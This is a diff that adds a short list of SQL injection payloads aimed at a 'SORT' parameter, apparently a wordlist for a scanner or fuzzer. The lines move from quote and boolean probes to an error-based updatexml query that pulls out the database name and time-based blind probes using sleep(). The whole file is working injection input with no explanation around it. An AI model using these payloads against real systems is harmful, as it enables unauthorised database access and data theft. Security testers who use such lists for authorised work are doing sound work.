@@ -1,0 +1,12 @@
+SORT:1
+SORT:1'
+SORT:1"
+SORT:1'
+SORT:1' and 1=1
+SORT:1' and '1
+SORT:1' and '1=1
+SORT:1' and '1
+SORT:1' or '1
+SORT:1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1
+SORT:1' and if(length(database())>5,sleep(1),1)
+SORT:1' and if(length(database())>5,sleep(1),1) or '1
